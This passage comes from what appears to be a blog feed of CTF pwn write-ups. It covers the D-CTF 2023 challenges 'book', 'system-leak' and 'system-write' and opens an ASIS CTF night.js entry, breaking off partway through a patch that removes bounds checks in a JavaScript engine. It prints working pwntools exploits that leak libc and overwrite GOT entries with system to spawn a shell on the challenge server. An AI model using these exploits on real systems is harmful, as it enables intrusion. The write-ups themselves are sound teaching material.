class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read_line(&amp;todos[<span class="number">48</span> * v1], <span class="number">48LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The same vulnerability as the previous function(<code>print_todo</code>) occurs. But this time, I can overwrite the address. </p><p>I decided to overwrite <code>atoi</code> with <code>system</code>. The <code>atoi</code> is good to overwrite <code>system</code>. Becuase It has an argument of pointer. </p><p>And luckily itâ€™s located next to <code>open_got</code>. I can simply put <code>open_got</code> and <code>system_addr</code>. :)</p><h3 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./book&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>,<span class="number">32692</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./book&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_entry</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store_entry</span>(<span class="params">idx,note</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, idx)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, note)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">store_entry(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;AAAA&#x27;</span>) <span class="comment"># for debugging</span></span><br><span class="line"></span><br><span class="line">print_entry(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;E: &#x27;</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;open_got: &#x27;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># local</span></span><br><span class="line"><span class="comment">#system = leak - 0xc3960</span></span><br><span class="line"><span class="comment"># remote</span></span><br><span class="line">system = leak -<span class="number">0xbba50</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(leak)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">store_entry(<span class="string">b&#x27;-4&#x27;</span>, payload )</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="system-leak-39-solves-x2F-247-points"><a href="#system-leak-39-solves-x2F-247-points" class="headerlink" title="system-leak (39 solves &#x2F; 247 points)"></a>system-leak (39 solves &#x2F; 247 points)</h2><blockquote><p>Leak the entire system, but wait this is not zeenbleed.<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Easy</code></p></blockquote><p>This challenge makes me confused. lol<br>There was an FSB, but all mitigation were applied. Since the difficulty level was <code>Easy</code>, I tried to think of it as easy. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);  <span class="comment">// bof</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);    <span class="comment">// fsb</span></span><br><span class="line">closelog();</span><br></pre></td></tr></table></figure><p>This is a part of main. I can find easily <code>bof</code> and <code>fsb</code>. Since now there was no clue, I had to figure out what to do. </p><p>I started to print all of stacks, finally I got <code>flag</code>.</p><h3 id="Solve-4"><a href="#Solve-4" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./syslog&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>, <span class="number">32063</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./syslog&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_syslog</span>(<span class="params">data</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_syslog</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">118</span>,<span class="number">1000</span>):</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$s&#x27;</span></span><br><span class="line">payload = payload.encode()</span><br><span class="line">write_syslog(payload)</span><br><span class="line">read_syslog()</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(i, leak)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="/images/231023-d-ctf2023-ALL_PWN/system-leak01.png" width=600/><br><h2 id="system-write-33-solves-x2F-287-points"><a href="#system-write-33-solves-x2F-287-points" class="headerlink" title="system-write (33 solves &#x2F; 287 points)"></a>system-write (33 solves &#x2F; 287 points)</h2><blockquote><p>Wait what? We can write data, but where?<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Hard</code></p></blockquote><p>This challenge is similar to previous challenge. Everything seems to be the same except for the mitigation.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>Because of <code>fsb</code> and <code>Partial RELRO</code>, I can overwritie something with <code>system</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> pri; <span class="comment">// [rsp+6h] [rbp-21Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+220h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n========== MENU ==========&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Write input to syslog&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Read syslog&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid option. Try again.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( idx == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);  <span class="comment">// bof</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">      fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);    <span class="comment">// fsb</span></span><br><span class="line">      closelog();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( idx != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      read_syslog();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>%[^\n]</code> essentially means â€œread characters until a newline character is encountered.â€ It is the same as entering a string with <code>gets</code>. So this can cause <code>bof</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">syslog</span><span class="params">(<span class="type">int</span> priority, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><ul><li><a href="https://man7.org/linux/man-pages/man3/syslog.3.html">https://man7.org/linux/man-pages/man3/syslog.3.html</a></li></ul><p><code>syslog</code> can cause <code>fsb</code>. There was difficulty in leaking the address. So I made a loop for this. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># let&#x27;s find the libc address</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$p&#x27;</span></span><br><span class="line">payload = payload.encode()</span><br><span class="line">write_syslog(payload)</span><br><span class="line">read_syslog()</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog-write: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(i, leak)</span><br></pre></td></tr></table></figure><p>I just printed them out one by one to find the libc address and hoped it would be the same as the offset in the remote environment. In the past, when leaking addresses using <code>fsb</code>, I had an experience where the local offset and remote offset were different.</p><p>I used it to find the <code>libc</code>.</p><ul><li><a href="https://libc.blukat.me/?q=__libc_start_main:dc0&amp;l=libc6_2.35-0ubuntu3_amd64">https://libc.blukat.me/?q=__libc_start_main%3Adc0&amp;l=libc6_2.35-0ubuntu3_amd64</a></li></ul><h3 id="Solve-5"><a href="#Solve-5" class="headerlink" title="Solve"></a>Solve</h3><ol><li>Leak the <code>libc address</code> (I leaked the <code>__libc_start_main+128</code>.)</li><li>Find the <code>libc version</code> for the <code>system address</code>.</li><li>Overwrite <code>fgets@got</code> with <code>sytem</code>.</li><li>Send the <code>/bin/sh\x00</code> through <code>fgets</code>. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> pri; <span class="comment">// [rsp+6h] [rbp-21Ah] BYREF</span></span><br><span class="line"><span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);    <span class="comment">// buffer overflow</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);</span><br></pre></td></tr></table></figure><ul><li>I added â€˜aâ€™*0xa before <code>/bin/sh\x00</code>.</li><li>When the <code>fgets</code> is overwrited by <code>system</code>, it is no longer <code>fgets</code>.</li><li>This means that before <code>fgets</code> call, the argument must already point to the area where <code>/bin/sh</code> is written.</li><li>So, when i write to <code>&amp;pri</code>, I write a dummy as much as 0xa size and put <code>/bin/sh</code>.</li><li>However, you can ignore it all and use <code>one_gadget</code>. (For this challenge only)</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./syslog-write&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>,<span class="number">31921</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./syslog-write&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_syslog</span>(<span class="params">data</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_syslog</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># let&#x27;s find the libc address</span></span><br><span class="line"><span class="string">for i in range(1, 101):</span></span><br><span class="line"><span class="string">payload = &#x27;%&#x27; + str(i) + &#x27;$p&#x27;</span></span><br><span class="line"><span class="string">payload = payload.encode()</span></span><br><span class="line"><span class="string">write_syslog(payload)</span></span><br><span class="line"><span class="string">read_syslog()</span></span><br><span class="line"><span class="string">leak = p.recvuntil(b&#x27;==========&#x27;).split(b&#x27;syslog-write: &#x27;)[-1].split(b&#x27;\n\n&#x27;)[0]</span></span><br><span class="line"><span class="string">print(i, leak)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># local 94</span></span><br><span class="line">write_syslog(<span class="string">b&#x27;%94$p&#x27;</span>)</span><br><span class="line">read_syslog()</span><br><span class="line">libc_leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog-write: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libc_leak)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">7</span>, &#123;</span><br><span class="line">    e.got[<span class="string">&#x27;fgets&#x27;</span>] : <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) -<span class="number">128</span> + <span class="number">0x26fa0</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">write_syslog(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xa</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> D-CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2023 - night.js (JavaScript Engine)</title>
      <link href="/230930-asisctf2023-nightjs/"/>
      <url>/230930-asisctf2023-nightjs/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1952">https://ctftime.org/event/1952</a></li></ul><blockquote><p>jspwnnn<br><code>nc 172.86.97.8 1337</code></p></blockquote><ul><li>[11 solves &#x2F; 271 points]</li></ul><p>After CTF, I solved it myself without referring to Writeups. It was really fun! xD.<br>This challenge is related with JavaScript Engine, but it had different exploit solution with the other JavaScript Engine like JSC.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="chall-txt"><a href="#chall-txt" class="headerlink" title="chall.txt"></a>chall.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commit hash: 799b465fac5672f167d6fec599fe167bce92862d</span><br><span class="line">You can build js with: `./Meta/serenity.sh run lagom js`.</span><br><span class="line">You probably don&#x27;t need to recompile since the provided binaries have debug symbols.</span><br></pre></td></tr></table></figure><h3 id="chall-patch"><a href="#chall-patch" class="headerlink" title="chall.patch"></a>chall.patch</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/./AK/ByteBuffer.h b/../patched-serenity/AK/ByteBuffer.h</span></span><br><span class="line"><span class="comment">index e2fc73bbfe..7bb7903e80 100644</span></span><br><span class="line"><span class="comment">--- a/./AK/ByteBuffer.h</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/AK/ByteBuffer.h</span></span><br><span class="line"><span class="meta">@@ -104,7 +104,7 @@</span> public:</span><br><span class="line"> </span><br><span class="line">     [[nodiscard]] u8&amp; operator[](size_t i)</span><br><span class="line">     &#123;</span><br><span class="line"><span class="deletion">-        VERIFY(i &lt; m_size);</span></span><br><span class="line"><span class="addition">+        // VERIFY(i &lt; m_size);</span></span><br><span class="line">         return data()[i];</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/./Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp b/../patched-serenity/Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="comment">index 2f65f7b6ca..ee9a1ca00f 100644</span></span><br><span class="line"><span class="comment">--- a/./Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="comment">+++ b/../patched-serenity/Userland/Libraries/LibJS/Runtime/ArrayBuffer.cpp</span></span><br><span class="line"><span class="meta">@@ -80,10 +80,10 @@</span> void copy_data_block_bytes(ByteBuffer&amp; to_block, u64 to_index, ByteBuffer const&amp;</span><br><span class="line">     VERIFY(from_index + count &lt;= from_size);</span><br><span class="line"> </span><br><span class="line">     // 4. Let toSize be the number of bytes in toBlock.</span><br><span class="line"><span class="deletion">-    auto to_size = to_block.size();</span></span><br><span class="line"><span class="addition">+    // auto to_size = to_block.size();</span></span><br><span class="line"> </span><br><span class="line">     // 5. Assert: toIndex + count â‰¤ toSize.</span><br><span class="line"><span class="deletion">-    VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"><span class="addition">+    // VERIFY(to_index + count &lt;= to_size);</span></span><br><span class="line"> </span><br><span class="line">     // 6. Repeat, while count &gt; 0,</span><br><span class="line">     while (count &gt; 0) &#123;</span><br><span class="line"><span class="meta">@@ -215,6 +215,7 @@</span> ThrowCompletionOr&lt;ArrayBuffer*&gt; array_buffer_copy_and_detach(VM&amp; vm, ArrayBuffer</span><br><span class="line"> </span><br><span class="line">     // 10. Let copyLength be min(newByteLength, arrayBuffer.[[ArrayBufferByteLength]]).</span><br><span class="line">     auto copy_length = min(new_byte_length, array_buffer.byte_length());</span><br><span class="line"><span class="addition">+    if(array_buffer.byte_length() &gt; 0x100) copy_length = array_buffer.byte_length();</span></span><br><span class="line"> 